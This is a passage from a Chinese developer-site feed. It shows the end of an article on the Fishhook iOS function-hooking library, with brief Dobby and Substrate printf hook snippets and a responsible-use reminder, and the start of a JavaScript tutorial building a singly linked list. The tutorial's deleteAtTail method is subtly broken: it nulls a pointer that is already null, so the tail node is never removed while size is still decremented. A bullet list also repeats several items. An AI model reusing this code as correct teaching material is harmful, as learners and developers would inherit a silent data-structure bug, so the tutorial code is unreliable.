<li><code>__nl_symbol_ptr</code>已被<code>__got</code>（全局偏移表）替代</li>
<li>所有需要立即绑定的符号现在都放在<code>__got</code>中</li>
<li>这是为了更好的位置无关代码支持和性能优化</li>
</ul>
<h2 data-id="heading-32">九、Fishhook的局限性</h2>
<h3 data-id="heading-33">1. 技术限制</h3>
<ul>
<li>只能Hook通过符号表调用的函数</li>
<li>无法Hook内联函数和静态链接函数</li>
<li>对C++函数支持有限（名称重整问题）</li>
<li>线程安全问题需要开发者自己处理</li>
</ul>
<h3 data-id="heading-34">2. 平台限制</h3>
<ul>
<li>iOS非越狱设备受限较多</li>
<li>某些系统函数受代码签名保护</li>
<li>不同iOS版本可能有行为差异</li>
</ul>
<h3 data-id="heading-35">3. 性能考虑</h3>
<ul>
<li>第一次Hook需要遍历符号表，有性能开销</li>
<li>频繁的动态Hook/Unhook可能影响性能</li>
<li>需要考虑多线程环境下的安全性</li>
</ul>
<h2 data-id="heading-36">十、未来展望</h2>
<h3 data-id="heading-37">1. 替代方案</h3>
<pre><code class="hljs language-objective-c" lang="objective-c">// 1. Dobby（原DobbyHook）
// 支持inline hook，更强大
#include &lt;dobby.h&gt;
DobbyHook((void *)printf, (void *)hooked_printf, (void **)&amp;original_printf);

// 2. substrate（越狱设备）
// iOS越狱环境下的完整Hook框架
MSHookFunction((void *)printf, (void *)hooked_printf, (void **)&amp;original_printf);
</code></pre>
<h3 data-id="heading-38">2. 发展趋势</h3>
<ul>
<li>Apple正在加强系统安全性</li>
<li>静态分析和运行时保护机制增强</li>
<li>对动态代码修改的限制可能增加</li>
<li>开发者需要更多关注官方提供的调试和监控API</li>
</ul>
<h2 data-id="heading-39">结语</h2>
<p>Fishhook通过精巧地利用Mach-O文件的动态链接机制，实现了轻量级的函数Hook功能。虽然它有一定的局限性，但仍然是理解macOS/iOS系统底层机制的绝佳案例，也是许多调试和监控工具的基础。</p>
<p>通过本文的详细解析，我们希望读者能够：</p>
<ol>
<li>深入理解Mach-O文件结构和动态链接机制</li>
<li>掌握Fishhook的工作原理和使用方法</li>
<li>了解不同Hook技术的适用场景</li>
<li>在实际开发中正确应用Hook技术</li>
</ol>
<p>记住，强大的工具也意味着重大的责任。Hook技术应该用于正当的调试、监控和优化目的，而不是破坏系统安全或侵犯用户隐私。</p>
<hr/>
<p><strong>参考资源：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Ffacebook%2Ffishhook" target="_blank" title="https://github.com/facebook/fishhook" ref="nofollow noopener noreferrer">Fishhook GitHub仓库</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.apple.com%2Flibrary%2Farchive%2Fdocumentation%2FPerformance%2FConceptual%2FCodeFootprint%2FArticles%2FMachOOverview.html" target="_blank" title="https://developer.apple.com/library/archive/documentation/Performance/Conceptual/CodeFootprint/Articles/MachOOverview.html" ref="nofollow noopener noreferrer">Apple Mach-O文件格式文档</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fopensource.apple.com%2Fsource%2Fdyld%2F" target="_blank" title="https://opensource.apple.com/source/dyld/" ref="nofollow noopener noreferrer">dyld源码分析</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fbook.douban.com%2Fsubject%2F30227889%2F" target="_blank" title="https://book.douban.com/subject/30227889/" ref="nofollow noopener noreferrer">iOS逆向工程：原理与实践</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手把手实现链表：单链表与双链表的完整实现]]></title>    <link>https://juejin.cn/post/7597619377430200374</link>    <guid>https://juejin.cn/post/7597619377430200374</guid>    <pubDate>2026-01-21T10:26:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597619377430200374" data-draft-id="7597596202025238570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手把手实现链表：单链表与双链表的完整实现"/> <meta itemprop="keywords" content="后端,JavaScript,算法"/> <meta itemprop="datePublished" content="2026-01-21T10:26:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="颜酱"/> <meta itemprop="url" content="https://juejin.cn/user/905653309941495"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手把手实现链表：单链表与双链表的完整实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/905653309941495/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    颜酱
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-21T10:26:37.000Z" title="Wed Jan 21 2026 10:26:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-21
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">手把手实现链表：单链表与双链表的完整实现</h2>
<p>链表是数据结构的基础，也是面试高频考点。很多初学者会卡在“指针操作混乱”“边界条件处理不当”等问题上。本文将从<strong>设计思路</strong>出发，拆解单链表实现的核心逻辑，同时补充双向链表（双链表）的实现方法，帮你彻底掌握链表的实现技巧。</p>
<h3 data-id="heading-1">一、为什么需要手动实现链表？</h3>
<p>编程语言（如JavaScript）没有内置链表结构，但链表的“动态扩容”“非连续存储”特性使其在插入/删除操作中比数组更高效（尤其是头部/中部操作）。手动实现链表的核心目标是：</p>
<ul>
<li>
<p>掌握<strong>指针（引用）操作</strong>的核心逻辑；</p>
</li>
<li>
<p>理解<strong>虚拟头/尾节点</strong>等技巧解决边界问题；</p>
</li>
<li>
<p>规避“空指针操作”“状态不同步”等高频报错；</p>
</li>
<li>
<p>区分单链表与双链表的设计差异，适配不同场景需求。</p>
</li>
</ul>
<h3 data-id="heading-2">二、单链表实现</h3>
<h4 data-id="heading-3">1. 单链表核心设计思路</h4>
<p>链表的最小单元是“节点（Node）”，每个节点包含两部分：</p>
<ul>
<li>
<p><code>val</code>：节点存储的值；</p>
</li>
<li>
<p><code>next</code>：指向下一个节点的指针（引用），默认<code>null</code>。</p>
</li>
</ul>
<p>链表类（MyLinkedList）需维护核心属性，且遵守<strong>状态同步约束</strong>：</p>

























<table><thead><tr><th>属性名</th><th>作用</th><th>核心约束</th></tr></thead><tbody><tr><td><code>dummyHead</code>（虚拟头节点）</td><td>统一头节点操作逻辑，避免单独处理头节点</td><td>始终存在，<code>next</code>指向真实头节点</td></tr><tr><td><code>tail</code>（尾节点）</td><td>优化尾插效率（从O(n)→O(1)）</td><td><code>size=0</code>时<code>tail=null</code>；<code>size&gt;0</code>时<code>tail</code>指向最后一个节点</td></tr><tr><td><code>size</code>（链表长度）</td><td>简化边界判断，避免冗余遍历</td><td>增/删操作必须同步更新，与<code>tail</code>状态严格一致</td></tr></tbody></table>
<h4 data-id="heading-4">实现步骤（从0开始设计）</h4>
<p><strong>第一步：定义节点类</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;   <span class="hljs-comment">// 节点值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// 指向下一个节点的指针</span>
  }
}
</code></pre>
<p><strong>第二步：设计链表类结构</strong></p>
<ol>
<li>初始化虚拟头节点（<code>dummyHead</code>）：统一头节点操作，避免边界判断</li>
<li>初始化尾节点（<code>tail</code>）：初始为<code>null</code>，空链表时无尾节点</li>
<li>初始化长度（<code>size</code>）：初始为<code>0</code>，记录链表节点数量</li>
</ol>
<p><strong>第三步：实现基础查询方法</strong></p>
<ul>
<li><code>isEmpty()</code>：判断链表是否为空（<code>size === 0</code>）</li>
<li><code>get(index)</code>：获取指定索引的节点值
<ul>
<li>边界校验：<code>index &lt; 0 || index &gt;= size</code> 返回 <code>-1</code></li>
<li>从<code>dummyHead.next</code>开始遍历到目标位置</li>
</ul>
</li>
</ul>
<p><strong>第四步：实现插入方法（核心：先连后断）</strong></p>
<ul>
<li>
<p><code>addAtHead(val)</code>：头部插入</p>
<ol>
<li>创建新节点</li>
<li>新节点<code>next</code>指向原头节点（<code>dummyHead.next</code>）</li>
<li><code>dummyHead.next</code>指向新节点</li>
<li>更新<code>size</code>，若<code>size === 1</code>则更新<code>tail</code></li>
</ol>
</li>
<li>
<p><code>addAtTail(val)</code>：尾部插入</p>
<ol>
<li>边界处理：空链表时调用<code>addAtHead</code></li>
<li>创建新节点</li>
<li><code>tail.next</code>指向新节点</li>
<li><code>tail</code>更新为新节点</li>
<li>更新<code>size</code></li>
</ol>
</li>
<li>
<p><code>addAtIndex(index, val)</code>：指定位置插入</p>
<ol>
<li>边界处理：<code>index &lt;= 0</code>调用<code>addAtHead</code>，<code>index &gt; size</code>直接返回</li>
<li>遍历到插入位置的前驱节点</li>
<li>新节点<code>next</code>指向原节点，前驱节点<code>next</code>指向新节点</li>
<li>若插入到尾部，更新<code>tail</code></li>
<li>更新<code>size</code></li>
</ol>
</li>
</ul>
<p><strong>第五步：实现删除方法（核心：先连后断）</strong></p>
<ul>
<li><code>deleteAtIndex(index)</code>：删除指定位置节点
<ol>
<li>边界校验：<code>index &lt; 0 || index &gt;= size || isEmpty()</code> 直接返回</li>
<li>遍历到删除位置的前驱节点</li>
<li>前驱节点<code>next</code>指向待删除节点的<code>next</code>（跳过待删除节点）</li>
<li>待删除节点<code>next</code>置为<code>null</code>（释放引用）</li>
<li>更新<code>size</code>，若删除的是尾节点，更新<code>tail</code></li>
</ol>
</li>
</ul>
<p><strong>关键设计要点：</strong></p>
<ul>
<li>✅ 使用虚拟头节点统一边界处理</li>
<li>✅ 维护<code>tail</code>指针优化尾插操作</li>
<li>✅ <code>size</code>与<code>tail</code>状态必须严格同步</li>
<li>✅ 所有指针操作前先校验边界条件</li>
<li>✅ 遵循"先连后断"原则：先建立新连接，再断开旧连接</li>
<li>✅ 使用虚拟头节点统一边界处理</li>
<li>✅ 维护<code>tail</code>指针优化尾插操作</li>
<li>✅ <code>size</code>与<code>tail</code>状态必须严格同步</li>
<li>✅ 所有指针操作前先校验边界条件</li>
</ul>
<h4 data-id="heading-5">2. 单链表完整实现</h4>
<pre><code class="hljs language-JavaScript" lang="JavaScript">
<span class="hljs-comment">/**
 * 单链表节点类
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 节点存储的值
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">LinkedNode</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">val</span> = val;       <span class="hljs-comment">// 节点值</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;     <span class="hljs-comment">// 指向下一个节点的指针</span>
  }
}

<span class="hljs-comment">/**
 * 单链表实现
 */</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MySinglyLinkedList</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(<span class="hljs-string">'_dummy'</span>); <span class="hljs-comment">// 虚拟头节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;  <span class="hljs-comment">// 尾节点</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> = <span class="hljs-number">0</span>;     <span class="hljs-comment">// 链表长度</span>
    <span class="hljs-comment">// 约束：size=0 时 tail=null；size&gt;0 时 tail 指向最后一个节点</span>
  }

  <span class="hljs-comment">/**
   * 判断链表是否为空
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">boolean</span>}
   */</span>
  <span class="hljs-title function_">isEmpty</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>;
  }

  <span class="hljs-comment">/**
   * 获取指定索引的节点值
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 目标索引（从0开始）
   * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">number</span>} 节点值，索引无效返回-1
   */</span>
  <span class="hljs-title function_">get</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }
    <span class="hljs-keyword">return</span> pointer.<span class="hljs-property">val</span>;
  }

  <span class="hljs-comment">/**
   * 头部插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtHead</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    newNode.<span class="hljs-property">next</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
    <span class="hljs-comment">// 空链表插入，尾节点同步更新</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    }
  }

  <span class="hljs-comment">/**
   * 尾部插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtTail</span>(<span class="hljs-params">val</span>) {
    <span class="hljs-comment">// 双重兜底校验：避免tail为null但size&gt;0的异常</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>() || <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> === <span class="hljs-literal">null</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>.<span class="hljs-property">next</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }

  <span class="hljs-comment">/**
   * 指定索引插入节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 插入位置
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">val</span> - 要插入的值
   */</span>
  <span class="hljs-title function_">addAtIndex</span>(<span class="hljs-params">index, val</span>) {
    <span class="hljs-keyword">if</span> (index &lt;= <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">addAtHead</span>(val);
      <span class="hljs-keyword">return</span>;
    }
    <span class="hljs-keyword">if</span> (index &gt; <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    <span class="hljs-keyword">const</span> newNode = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedNode</span>(val);
    newNode.<span class="hljs-property">next</span> = pointer.<span class="hljs-property">next</span>;
    pointer.<span class="hljs-property">next</span> = newNode;

    <span class="hljs-comment">// 插入到尾部时更新tail</span>
    <span class="hljs-keyword">if</span> (index === <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = newNode;
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>++;
  }

  <span class="hljs-comment">/**
   * 删除头部节点
   */</span>
  <span class="hljs-title function_">deleteAtHead</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">const</span> oldHead = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span> = oldHead.<span class="hljs-property">next</span>;
    oldHead.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
    <span class="hljs-comment">// 同步更新tail</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (oldHead === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
    }
  }

  <span class="hljs-comment">/**
   * 删除尾部节点
   */</span>
  <span class="hljs-title function_">deleteAtTail</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) <span class="hljs-keyword">return</span>;

    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">1</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">deleteAtHead</span>();
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">while</span> (pointer.<span class="hljs-property">next</span>.<span class="hljs-property">next</span>) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    pointer.<span class="hljs-property">next</span>.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = pointer.<span class="hljs-property">next</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
  }

  <span class="hljs-comment">/**
   * 删除指定索引节点
   * <span class="hljs-doctag">@param</span> {<span class="hljs-type">number</span>} <span class="hljs-variable">index</span> - 要删除的索引
   */</span>
  <span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-params">index</span>) {
    <span class="hljs-keyword">if</span> (index &lt; <span class="hljs-number">0</span> || index &gt;= <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> || <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">isEmpty</span>()) {
      <span class="hljs-keyword">return</span>;
    }

    <span class="hljs-keyword">let</span> pointer = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>;
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; index; i++) {
      pointer = pointer.<span class="hljs-property">next</span>;
    }

    <span class="hljs-keyword">const</span> nodeToDel = pointer.<span class="hljs-property">next</span>;
    pointer.<span class="hljs-property">next</span> = nodeToDel.<span class="hljs-property">next</span>;
    nodeToDel.<span class="hljs-property">next</span> = <span class="hljs-literal">null</span>;

    <span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span>--;
    <span class="hljs-comment">// 同步更新tail</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">size</span> === <span class="hljs-number">0</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = <span class="hljs-literal">null</span>;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nodeToDel === <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">tail</span> = pointer.<span class="hljs-property">next</span> || pointer;
    }
  }
}

<span class="hljs-comment">// 单链表测试用例</span>
<span class="hljs-keyword">const</span> singlyList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MySinglyLinkedList</span>();
singlyList.<span class="hljs-title function_">addAtHead</span>(<span class="hljs-number">1</span>);
singlyList.<span class="hljs-title function_">addAtTail</span>(<span class="hljs-number">3</span>);
singlyList.<span class="hljs-title function_">addAtIndex</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"单链表get(1):"</span>, singlyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 输出2</span>
singlyList.<span class="hljs-title function_">deleteAtIndex</span>(<span class="hljs-number">1</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"单链表get(1):"</span>, singlyList.<span class="hljs-title function_">get</span>(<span class="hljs-number">1</span>)); <span class="hljs-comment">// 输出3</span>
</code></pre>
<h4 data-id="heading-6">3. 单链表核心易错点</h4>



































<table><thead><tr><th>易错点</th><th>错误表现</th><th>修复方案</th></tr></thead><tbody><tr><td><strong>空指针操作</strong></td><td><code>Cannot set properties of null (setting 'next')</code></td><td>所有指针操作前先校验<code>null</code>，使用<code>isEmpty()</code>或<code>size</code>判断</td></tr><tr><td><strong>tail状态不同步</strong></td><td>删除节点后<code>tail</code>仍指向已删除节点</td><td>删除操作后同步更新<code>tail</code>，<code>size=0</code>时<code>tail=null</code></td></tr><tr><td><strong>边界条件遗漏</strong></td><td><code>index=0</code>或<code>index=size</code>时操作失败</td><td>使用虚拟头节点统一处理，特殊位置单独判断</td></tr><tr><td><strong>指针操作顺序错误</strong></td><td>先断开原链表导致节点丢失</td><td>遵循"先连后断"原则：先建立新连接，再断开旧连接</td></tr><tr><td><strong>size未同步更新</strong></td><td><code>size</code>与实际节点数不一致</td><td>每次增/删操作必须同步更新<code>size</code></td></tr></tbody></table>
<p><strong>调试技巧：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 添加调试方法：打印链表结构</span>
<span class="hljs-title function_">toString</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> values = [];
  <span class="hljs-keyword">let</span> current = <span class="hljs-variable language_">this</span>.<span class="hljs-property">dummyHead</span>.<span class="hljs-property">next</span>;
  <span class="hljs-keyword">while</span> (current) {
    values.<span class="hljs-title function_">push</span>(current.<span class="hljs-property">val</span>);
    current = current.<span class="hljs-property">next</span>;
  }
